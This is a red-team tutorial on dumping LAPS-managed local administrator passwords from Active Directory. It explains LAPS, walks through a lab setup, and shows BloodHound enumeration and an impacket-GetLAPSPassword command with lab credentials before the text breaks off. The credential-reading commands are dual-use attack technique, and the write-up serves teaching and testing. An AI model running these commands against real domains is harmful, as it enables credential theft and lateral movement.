<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a>, <a href="https://www.hackingarticles.in/category/red-teaming/domain-credential/" rel="category tag">Domain Credential</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: LAPS</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-laps/" rel="bookmark"><time class="entry-date published" datetime="2020-05-31T08:32:33+00:00">May 31, 2020</time><time class="updated" datetime="2025-05-16T21:05:53+00:00">May 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will be discussing the concept of Credential Dumping and LAPS (Local Administrator Password Solution). We will delve into the world of password management and explore how LAPS can help mitigate the risks associated with using shared local accounts and passwords across a domain. With the increasing threat of cyber attacks, it’s essential to understand the importance of secure password management and how LAPS can help streamline this process.</span></p>
<h3><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li><span style="color: #000000;">Introduction to LAPS</span></li>
<li><span style="color: #000000;">Prerequisites</span></li>
<li><span style="color: #000000;">Lab Setup</span></li>
<li><span style="color: #000000;">Exploitation Phase</span></li>
<li><span style="color: #000000;">Bloodhound – Hunting for Weak Permissions</span></li>
</ul>
<p><strong><span style="color: #000000;">Method for Exploitation – Credential Dumping (T1003)</span></strong></p>
<ul>
<li><span style="color: #000000;">Impacket</span></li>
<li><span style="color: #000000;">NXC Tool</span></li>
<li><span style="color: #000000;">PyLaps</span></li>
<li><span style="color: #000000;">LAPSDumper</span></li>
<li><span style="color: #000000;">BloodyAD</span></li>
<li><span style="color: #000000;">Ldapserch</span></li>
<li><span style="color: #000000;">mesploit: ldap_query</span></li>
<li><span style="color: #000000;">impacket-ntlmrelayx</span></li>
<li><span style="color: #000000;">ldap_shell</span></li>
<li><span style="color: #000000;">Powershell</span></li>
<li><span style="color: #000000;">NetTools</span></li>
<li><span style="color: #000000;">sharplaps</span></li>
<li><span style="color: #000000;">Metasploit: enum_laps</span></li>
<li><span style="color: #000000;">PowerView</span></li>
<li><span style="color: #000000;">AD Explorer – Sysinternals</span></li>
</ul>
<p><strong><span style="color: #000000;">Conclusion</span></strong></p>
<h3><span style="color: #800000;">Introduction to LAPS</span></h3>
<p><span style="color: #000000;">The Local Administrator Password Solution (LAPS) is a tool designed to manage local account passwords for computers joined to a domain. It securely stores these passwords in <strong data-start="449" data-end="474">Active Directory (AD)</strong> and protects them using <strong data-start="499" data-end="530">Access Control Lists (ACLs)</strong>. Consequently, only authorized users can access or reset them.</span></p>
<h5><span style="color: #000000;"><strong>Key Benefits of LAPS</strong></span></h5>
<p><span style="color: #000000;">In setups where users must log into computers without domain credentials, managing passwords can become challenging and heighten the risk of Pass-the-Hash (PtH) attacks. Therefore, <strong data-start="813" data-end="821">LAPS</strong> addresses the problem of using a shared <strong data-start="862" data-end="879">local account</strong> with the same password across all <strong data-start="914" data-end="939">computers in a domain</strong>. It assigns a unique, randomly generated password to the <strong data-start="997" data-end="1028">local administrator account</strong> on each machine. As a result, <strong data-start="1059" data-end="1084">domain administrators</strong> can control which users, such as helpdesk staff, can view these passwords.</span></p>
<h5><span style="color: #000000;"><strong>How LAPS Enhances Security</strong></span></h5>
<p><span style="color: #000000;"><strong>LAPS </strong>streamlines password management while bolstering defenses against cyber threats. Specifically, it reduces the risk of <strong data-start="1327" data-end="1347">lateral movement</strong> within a network, a vulnerability that arises when identical local administrative credentials are used across multiple computers. It stores passwords for each computer’s <strong data-start="1518" data-end="1549">local administrator account</strong> in <strong data-start="1553" data-end="1573">Active Directory</strong> within a confidential attribute tied to the computer’s AD object. Furthermore, computers update their password information in AD, and <strong data-start="1712" data-end="1737">domain administrators</strong> assign read permissions to specific users or groups, like helpdesk teams.</span></p>
<h5><span style="color: #000000;"><strong>Implementation and Management of LAPS</strong></span></h5>
<p><span style="color: #000000;">With LAPS, local administrator passwords on domain-joined computers are automatically managed, ensuring they are unique, randomly created, and safely stored in Active Directory. Since it is built entirely on <strong data-start="2078" data-end="2099">AD infrastructure</strong>, <strong data-start="2101" data-end="2109">LAPS</strong> requires no additional technologies. Moreover, it relies on a <strong data-start="2172" data-end="2216">Group Policy client-side extension (CSE)</strong> installed on managed computers to handle all tasks, and it includes management tools that simplify configuration and oversight.</span></p>
<h4><span style="color: #800000;">Working of LAPS</span></h4>
<p><span style="color: #000000;">At its core, LAPS uses a Group Policy client-side extension (CSE) that performs key functions during a Group Policy update. First, it checks if the <strong data-start="382" data-end="424">local Administrator account’s password</strong> has expired. If it has expired or needs to change pre-emptively, the CSE immediately generates a new password and ensures it complies with the <strong data-start="568" data-end="587">password policy</strong>. Then, the CSE updates <strong data-start="611" data-end="631">Active Directory</strong> with the new password, stores it as a <strong data-start="670" data-end="696">confidential attribute</strong> linked to the computer’s account, and records the password’s next expiration date in a separate attribute. Additionally, it updates the <strong data-start="833" data-end="869">Administrator account’s password</strong> on the computer. Finally, authorized users can retrieve the password from <strong data-start="944" data-end="964">Active Directory</strong> or request a password reset for a specific machine as needed.</span></p>
<h4><span style="color: #800000;">Types of LAPS</span></h4>
<h4><span style="color: #000000;">Legacy Microsoft LAPS (MS LAPS)</span></h4>
<ul>
<li><span style="color: #000000;">First, Legacy Microsoft LAPS requires an Active Directory schema extension (ms-MCS-AdmPwd) to operate.</span></li>
<li><span style="color: #000000;">Additionally, administrators must install a separate MSI on all client machines.</span></li>
<li><span style="color: #000000;">They can manage it through PowerShell, Group Policy Objects (GPO), and the LAPS UI.</span></li>
</ul>
<h4><span style="color: #000000;"> New Windows LAPS (Integrated in Windows 10/11 &amp; Server 2019/2022)</span></h4>
<ul>
<li><span style="color: #000000;">In contrast, the New Windows LAPS is built into Windows, so it doesn’t require a separate installation.</span></li>
<li><span style="color: #000000;">It securely stores local administrator passwords in Active Directory (AD) or Azure AD.</span></li>
<li><span style="color: #000000;">Moreover, it supports password encryption for enhanced security.</span></li>
<li><span style="color: #000000;">Administrators can manage it via PowerShell, GPO, and Microsoft Intune.</span></li>
</ul>
<h3><span style="color: #800000;">Pre-requisites </span></h3>
<ul>
<li><span style="color: #000000;"><strong>OS</strong>: Windows Server 2019 (domain-joined; legacy LAPS works from Server 2003 SP1+).</span></li>
<li><span style="color: #000000;"><strong>Software</strong>: .NET Framework 4.0+, PowerShell 2.0+ (both included by default in Server 2019).</span></li>
<li><span style="color: #000000;"><strong>AD</strong>: Schema Admin rights for updates, functional AD domain.</span></li>
<li><span style="color: #000000;"><strong>Permissions</strong>: Local admin rights for installation, Domain Admins for AD configuration.</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<h5><span style="color: #000000;"><strong>Create the AD Environment:</strong></span></h5>
<p><span style="color: #000000;">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
<h5><span style="color: #000000;"><strong>Domain Controller</strong>:</span></h5>
<ul>
<li><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended).</span></li>
<li><span style="color: #000000;">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services.</strong></span></li>
<li><span style="color: #000000;">Set up the domain (e.g., <strong>local</strong>).</span></li>
</ul>
<h5><span style="color: #000000;"><strong>Create an  Organizational Unit</strong></span></h5>
<p><span style="color: #000000;">Organizational units (OUs) in an Active Directory Domain Services (AD DS) managed domain let you logically group objects such as user accounts, service accounts, or computer accounts. You can then assign administrators to specific OUs and apply group policy to enforce targeted configuration settings<strong>.</strong></span></p>
<p><span style="color: #000000;">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></p>
<p><span style="color: #000000;"><strong> </strong>Right-click on <strong>Domain (ignite.local)</strong> and click on <strong>New</strong>, and then click on <strong>Organizational Unit</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4lK_JKStwstIwfkmEc-6EIdQuvqC27GEasHWNIVITxMh89qEWfaowCPzQGnFmw00LCLTaJ3F5kuPHE4TRTDLO6wSqJmT8jzXAFFVaOslxftJaUmJhPibm8DzDjGDpwe8QHsDAgn8kIh7WqN_Qhs1H4fyj98VQz8ZaChMWugaUF8qoBdPETpNkcR6biVoi/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Assign the name of Other U as <strong>Tech.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuYauIU1tzYcuWhetA_OU2jbuODb2J2VmNn3joyqJYiETD2vyTefacMRVT7renBaZzICNNJDJyja1cIpdbtD4HUdAk1OCkNpf70eNWTsCp6vYnsx5q8O4SlA5TpzsVs182S4VzDFV_hhV6TKcs59OKjpg6Wa3knQoEPWrfb6bqKTBUkgU9TpF62j46bjXS/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Add your client machine to the Tech OU.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIUF7Q82kEvXvRULrZPJLK0q0NFdPDY_Nj1I-0KmksPG8O-foJ16g99feFzHDU6Kz_VZCcwHz9QmDprpmYu-8dPQ-eD8hcSackZ_JUs9vt_9tPXEH_LrnfUG_wUon1vKyK5jqWzazYQyBjhARjSJxtz0K-Vt_SwCfG4s9f7jrtLNmHAuTN9kZKIGGHk75p/s16000/3.png"/></span></p>
<h5><span style="color: #000000;"><strong>Download and Install LAPS</strong></span></h5>
<p><span style="color: #000000;">Before beginning with the credential dumping phase, we need to setup the LAPS on our Windows Server 2016 or Windows 10 machine. We need to perform 3 specific tasks that include installation of LAPS fat client, Configuring PowerShell Module, and Implementing Group Policy templates.</span></p>
<h5><span style="color: #000000;"><strong>Download LAPS</strong></span></h5>
<p><span style="color: #000000;">Get the latest version of LAPS from the<span style="color: #0000ff;"> <a style="color: #0000ff;" href="https://www.microsoft.com/en-us/download/details.aspx?id=46899&amp;gt&amp;msockid=344bf04e182560d002ade5f219be6164">Microsoft Download Center</a></span>.</span></p>
<h5><span style="color: #000000;"><strong>Install LAPS on the DC</strong></span></h5>
<p><span style="color: #000000;">Run the .msi installer and select:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Management Tools</strong> (for the LAPS UI)</span></li>
<li><span style="color: #000000;"><strong>Group Policy Templates</strong> (for configuring LAPS via GPO)</span></li>
<li><span style="color: #000000;"><strong>PowerShell Module</strong> (for command-line management)</span></li>
</ul>
<p><span style="color: #000000;">Complete the installation</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqYLvIPO3iqkiE3pprG2Zmp7RmMkREPKfb-2xmh3mOnLRAxSQ2BLKF0uiBUvUxDKZRojdrZGXIKJFcINRa7BleouBhkYM6-gkA6Yslvboa6wR8pu5vOiZQs4jNbs6GLqS6xvYI3plxGNgbSNDL7nDo94CVtCoWFBjbIXro2LHl671vqWhX73oUp4w7OtIh/s16000/4.png"/></span></p>
<h5><span style="color: #000000;"><strong>Configure Group Policy for LAPS</strong></span></h5>
<p><span style="color: #000000;">Open the Group Policy Management Console (GPMC).</span></p>
<p><span style="color: #000000;">Create a new GPO or edit an existing one.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRr1AAhnwsyTH0tPQ_MRipzJc2SWP1-aINTD6quvq4lKhhKMskoNEmYFwhGXdzblhvhCWBTeMGrRHVelOoMYAwZ0AlMMn5L9K_gMfkWJPq5ckyU2QYDBbQabVC4Ng7QgsWlLuesu-TTeZknpl5PVVDQxaEbGoVlkejP2W01B-OQDj6hyphenhyphennBafwgDKbcwD0o/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Navigate to: Computer Configuration → Administrative Templates → LAPS.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiV8geCWXqva7sqpNszGFpAAqzlwSsK_MZ0eh38v4I30_qndJgvr6JX75mgAvrc5FBh2QAeCM6sO8vJmQKrfWPlP-jfC99cjlwIfRfJQwiz8vtwq4ZU-AF-EgSsHprGZWUAs0scUHWc42KcDC-1-qyOlp_XZHcYwKkHU8OmrUmx2L_0G9fmztHizSX7fOUG/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Configure the following settings: Screenshot given below</span><br/>
<span style="color: #000000;"><strong>Password Settings: </strong>Set to Enabled<strong><br/>
Password Complexity → </strong>Large letters + small letters + numbers +specials<strong><br/>
Password Length → </strong>Set length (default: 14).<strong><br/>
Password Age (Days) → </strong>Define the expiry (e.g., 30 days).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAWznJHY4dv92BK3SPNclbEsChIAGQYW-GV1hnkxC_JaAx5q2kp_ksYh0V37yBp-dpsiZtmAmUYBiZuSMu1INKDs_kr8moYrIZMQGoFcPE6XPartsQVphBjrMTXTrM29rlAl5UZFF5gdkj83lNJI4RfSfcL9oueH4wKD08X4OW543tcQx82XYoNO1qhRbo/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Enable Name of Administrator account to manage → Set to Enabled.</span><br/>
<span style="color: #000000;">And set the administrator account name, in this case,e <strong>ieuser</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhytXS0oaSTYERmzFJ0cRGOwm9FdRJkFP1IR3ytZm9OOTgUluZoeCaEU0v-RaiGZ0OkdllkO8wH28nVhxDtEM1n_IdzWS27MEN7MfhTI5QyPxtPAJrwlqiiCQHv3OfXz6cSLSOWq7DiVOUq5RswARdh2wm2jjM0prOl_wf53xcdEKezbj5UDqDp5t1nNCHc/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Enable Local admin Password Management → set to Enabled.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBvnR7qwkYOdQLVe0eMQRjr9ecVZOMrozFTr1WtXloUJUKHHliWtM03EAuYsk2PYsm-fjRUfXF26A-z8a-Aml-SMUPbFem83pAZyBS9Gv2soLMoHlzI4UdkfP4gLw0rdgTUe6BUbOQltXge4u1eaZ_p3lHOwgWrvuF9RwN-gTuvG9EsPRaWP7jxD9XFbkH/s16000/9.png"/></span></p>
<p><span style="color: #000000;">To make all the changes in the policy active, we need to perform a Group Policy update as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgODEjjmElsIBqf8V8Fu8Kw6ndxpi6s4QGwiCGGyixPxrVtMgZJnCj_Km_i4GnomLn_llinridODyivM1OSr_zHikMH6F_CGDZrFj2wAL-8wl9cj9BUiXLyaSKB8LFJEL6i3WWZeHYznxcpom8EF7N61cH7Kk8nxlKoZ8z-Spahp0UsIhDRJKzuxnOOK-kg/s16000/10.png"/></span></p>
<h5><span style="color: #000000;"><strong>Extend AD Schema for LAPS</strong></span></h5>
<p><span style="color: #000000;">Open PowerShell as Administrator on the DC &amp; run the following command to update the schema:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
Import-Module AdmPwd.PS
Update-AdmPwdADSchema</pre>
<p><span style="color: #000000;">This will create two new attributes in <strong>Active Directory (AD)</strong>:</span></p>
<p><span style="color: #000000;"><strong>ms-MCS-AdmPwd</strong> → Stores the local admin password.</span></p>
<p><span style="color: #000000;"><strong>ms-MCS-AdmPwdExpirationTime</strong> → Stores the password expiration time.</span></p>
<p><span style="color: #000000;"><strong>Set AD Permissions</strong></span></p>
<p><span style="color: #000000;">Allow Computers to Update Their Own Passwords</span></p>
<div class="">
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-AdmPwdComputerSelfPermission -OrgUnit Tech</pre>
</div>
<p><span style="color: #000000;">Grant Admins Access to View Passwords</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-AdmPwdReadPasswordPermission -OrgUnit Tech -AllowedPrincipals Administrators
</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgleLq-NfJaw7oe5AL_fOiyyHWM3VWt5vKWPvdkP2r-AagXMt5zMUiOckVLOIp6n3C-bm6s0ketZwHED-L3H4j9tui2IKHu_Ce6_Ti_3ICYPWHNAiYgjvItDocvJNFVBYMkcBh7-bVrERndCvagi7T2J577lBEDHavn4D9lANIwQFPJwLVyb7IAY2sNrIlM/s16000/11.png"/></span></p>
<h5><strong><span style="color: #000000;">Deploy LAPS to Client Machines</span></strong></h5>
<p><span style="color: #000000;">Install LAPS on all client machines via GPO, SCCM, or manual installation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirkgDqLeej6v6WPRxrHwR_wx8M11LhZpdOyhSESa_ecOeDP-ijzHest-IK7ZLm0akPYJYIGXC9wAnnXLNvUvFRtEoTRyz9IcU13iu_Any6noBzWYrCqG6uDdiwRacCxup97nqX7D25MO3pJiVTeB4FGfnaNCq2Bp1s7GPvkK60cod69A7riLRoGkjrztc7/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Ensure the LAPS agent is running by executing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gpupdate /force</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje3NgLwQ307sGuqAaJMXr9v7jWEK9jU1Spcy4rgnK2-RorA_-fYuXqF7WKZ8uk1znRgwJvHJQSo1c0m2prnlzmlmA4YikGfQHiL3CHSdnCEm-8gnarEwpTzffU3ix-ftHl3ss9W_hXgOTNJCXlUcqOUOkX5XWWuqj3aQkIotugQrw9V0Eh0aIzhnqENSbX/s16000/13.png"/></span></p>
<h5><strong><span style="color: #000000;">Test LAPS</span></strong></h5>
<p><span style="color: #000000;">Now to ensure that it is working fine, let’s check the password given by LAPs to Client Machine (MSEDGEWIN10) in its properties.  As you can observe in the given below image the LAPS has assigned the random password to the Client Machine (MSEDGEWIN10).</span><br/>
<span style="color: #000000;">Open <strong>Active Directory Users and Computers </strong>(ADUC) on the Domain Controller.</span><br/>
<span style="color: #000000;">Locate User Client Machine <strong>(MSEDGEWIN10)</strong> in the <strong>Tech OU.</strong></span><br/>
<span style="color: #000000;">Under its <strong>properties</strong>, click on <strong>Attribute Editor.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVMs-VxUvU_KuZ1TAFqYXyPP5K8NgK1xV4-hZFmtdS5-hjTcCdARI3DlUtsL0QsDx5Lek8o0DOxoUhmWUbYiXhAyFjtvIPuixoQWg55EHAqQlrabyWARyrDw5-bpfBOWotX6H95qMVorsgmbyd-16LJjJLc3tJZ_KDZWVx7mS7VZ8GR6eeHtPo2Fi_dbKW/s16000/14.png"/></span></p>
<p><span style="color: #000000;"><strong>Intro</strong>: Setting up a user (raj) to retrieve LAPS-managed passwords from AD. This isn’t an attack by itself—it’s a legitimate administrative action if done by an authorized admin. However, if an attacker gains control of the raj account or performs these steps without authorization, it could lead to a <strong>privilege escalation attack</strong> or <strong>credential theft</strong> in the following ways:</span></p>
<p><span style="color: #000000;">Create the Domin User</span></p>
<p><span style="color: #000000;">Create an AD user account named Raj.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user raj Password@1 /add /domain</pre>
<h5><span style="color: #000000;"><strong>Understand the LAPS Security Model</strong>:</span></h5>
<p><span style="color: #000000;">LAPS stores local admin passwords in the ms-Mcs-AdmPwd attribute, which is protected by default. Only specific groups (e.g., Domain Admins) or explicitly delegated users can read it.</span></p>
<p><span style="color: #000000;">The win1 account didn’t have permission to read this attribute, so you’re creating a new user (raj) and granting the minimum permissions needed to retrieve LAPS passwords.</span></p>
<h5><span style="color: #000000;"><strong>Add a new domain user to the Client Machine with AllExtendedRights Permission.</strong></span></h5>
<p><span style="color: #000000;">Open <strong>ADUC</strong>. Navigate to <strong>Tech OU</strong> under the domain. You should see <strong>Client Mahine (MSEDGEWIN10)</strong> listed, right click on it and go to <strong>properties.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhK5ehAfIvkLvtG-lZH-n_hntSTp-o_5M0uDjXPq5bbMzl0VDJb2v7yEgc8o_ZVsq53WXVtAmFOyPh9BAGduLwUWAGBr39pEUpk7bD7YeIORqshc-INeB15ZbYguabaaeQI39wES8D-GCmbvPouz7dbCGhyphenhyphenO1IhRj4K4FqLrMrRyoIlc06LyjMqJ2diFxSX/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Go to the <strong>Security</strong> tab, and click on the <strong>Add</strong> button.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhorzjb7-7FQDOkg1KVq-8rLOvUXzg5eVCA0QYGmuBQE82Wbn0KPV5VjF7jpmZn0JScuQ6acP_TAZFwpirBWBjookWPRecXRnFISFPBKBPrlpdac3NW5YXWNmuZeit7LJ7g9z_PXQhg9uOxSov8cLKF3iL0j88fchKb9n5RIL-08XDJZ0AYsbVOzMwKy9-F/s16000/17.png"/></span></p>
<p><span style="color: #000000;">In the “Enter the object name to select” box, type <strong>raj </strong>and click <strong>Check Names </strong>and click on OK.</span></p>
<p><span style="color: #000000;">Select the <strong>Raj </strong>user and click on the <strong>advanced</strong> option.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjxfSUMbU0B-y5wQNFf12KfvYIFkwoks6lJuk1jiYSEu-dM5CPhpz8xXu06WvbHJnyLoUfpfujNV5Vj3tghC69rDQ47hlANWi_c4-orVvWXxbS3YXEIGs5yq-BiTpUwf6PVJHyBmz_Tcadv7yP7RibHYh8HN1pAgYjxdk5LJ0VDXT-jbeweoS4ulWcjLzA/s16000/18.png"/> </strong></span></p>
<p><span style="color: #000000;">In the <strong>Advanced security settings </strong>box, double-click on the <strong>Raj</strong> user’s permission entry.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUU2KadfYaHtBsPiwho6PiwAPe3YVUu0CdeK-BeBLlT5ybaGPXHkg8ZVWTI-g1RavaZxa143VuKFA_vJoNtQr-VPJ-zfpcmu9ZwKZ4HtXmGMsiEzoD49jKhNCwXRhZfLA8NQ2nBez20mZ9EOo9enlu9NFloOCWYb_EVGz8_TCtsNaJ9bbDhSMkeQmLyd7B/s16000/19.png"/></strong><strong> </strong></span></p>
<p><span style="color: #000000;">In the <strong>Permissions</strong> section, check the box for <strong>All Extended Rights</strong> permission. </span></p>
<p><span style="color: #000000;"> Apply the settings.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0P9My90Ra5N6km7Nh1NnOMkIqV8PfL6WQU51CerI_AVx4cxNzkBmHxl8nKPBErz1hyphenhyphenEn94HGri8lBeAMiqsemWO1nDP-zmrETJHJn82wjT4QdzGmUDl-EkV350OM1otI3VGUHT7v2ujZlgbqhRz2DwDStSu7QsLJ2lSL7oWJQDCCahO4MbRA3Wtawnmwy/s16000/20.png"/> </strong></span></p>
<h5><span style="color: #000000;"><strong>Explanation: All Extended Rights: </strong></span></h5>
<ul>
<li><span style="color: #000000;">“All extended rights” includes additional permissions, such as the ability to read sensitive attributes or perform specific AD operations (e.g., password resets).</span></li>
<li><span style="color: #000000;">For LAPS, the specific extended right needed is often tied to reading ms-Mcs-AdmPwd or related attributes (e.g., ms-Mcs-AdmPwdExpirationTime). However, granting “All extended rights” is broader than necessary—it’s a catch-all that includes the required right but also grants other unnecessary permissions (e.g., resetting the computer’s password).</span></li>
<li><span style="color: #000000;">You’re adding this because some LAPS implementations or tools (like impacket-GetLAPSPassword) might require additional rights beyond just “Read” to successfully query the attribute, depending on the AD schema or configuration.</span></li>
</ul>
<p><span style="color: #000000;">We are now done with setting up the Lab environment for LAPS on Windows.</span></p>
<h3><span style="color: #800000;">Exploitation Phase</span></h3>
<h3><span style="color: #800000;">Bloodhound – Hunting for Weak Permissions</span></h3>
<p><strong><span style="color: #000000;">Explanation of BloodHound</span></strong></p>
<p><span style="color: #000000;"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Raj</strong> has the <strong>AllExtendedRights</strong> permission for <strong>Client Machine (MSEDGEWIN10)</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u raj -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiM1KVV-TgFf7Np6mGWwEL6459NIzY7_StX60bfKPUwatHAQW_u9wUdMupWlUCZs8AHg49sp435cs8DjoD7OwDfRDhZQ7I0DM96mVSCUbFthlQp878lBMTl1NsyvkVM5IB8ni532Bed-jjG4IKs9V0Oi5xU5CADTPCKpt3dWI4YXo1dFSqirjArozJjtc0C/s16000/45.png"/></strong></span></p>
<p><span style="color: #000000;">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for the selected user where the first degree of object control value is equal to 1.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJyKn_k9PVapoKHAQDORTnMKaeJ3RdBF_OupTy02VuwsxJgar9B9J0R1nxpHkHt1fJPUn3dIJFfIntwpWf7Grb2TLz0ITySy73oSB9aqQSa0lB7AMdfLmAyqbjvml0ii8JA9uSL8pF2S61Cdiw8RFZj14Wnv8g1A5FOB2LrPM6aCE6chGOimvceh0pr1E9/s16000/46.png"/></strong></span></p>
<p><span style="color: #000000;">You can see the result, the Raj user has All Extended rights.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJCB_Mf2IyWvuzBg-aco7xmfiyOsvDzLm3tDNpr31aA_A5DtsaXq0WEZq0TnwdiC-pjpiv7h1CKSsALGf8P1_tBgb5rnAJugtAyPEI7itxOv7SSPiajvuWupv5XLvcf6OwkOaseT6-z_Hl3VWOSQ2zwtqWTLbM8A1OrPYq_JIHp4C_GHzAWH330aR1HkE7/s16000/47.png"/></strong></span></p>
<p><span style="color: #000000;">If you navigate to help section, you will find the explanation about what all Vulnerabilities this configuration might have and how you can attack leveraging this.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpakDksiufLZxbLzgQZAC5VgF-uCMWgRTy-W-RApHxzVfTJ4Ke-__ulXZb5wS6npbI7Vml9Nn-9TVD9iKpeQkgXjDel7fAO_yTruUu4ozKN8vrhomUOdUnMjopukku669G4I2huEuOCv6_QUH_cY6YrPHJwp2fZAz__NZX53he9sgm87yu31dexu3AVSgz/s16000/48.png"/> </strong></span></p>
<h3><span style="color: #800000;">Method for Exploitation – Credential Dumping (T1003)</span></h3>
<p><span style="color: #000000;">Let’s use various other tools to perform the attack and retrieve the local admin password,d which is set by the LAPS tool</span></p>
<h3><span style="color: #800000;">Impacket</span></h3>
<p><span style="color: #000000;">The <strong>Impacket</strong> tool suite is a collection of Python libraries and scripts designed for working with network protocols, particularly those used in Windows environments, such as SMB, Kerberos, LDAP, and NTLM.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> impacket-GetLAPSPassword ignite.local/raj:Password@1 -dc-ip 192.168.1.48</pre>
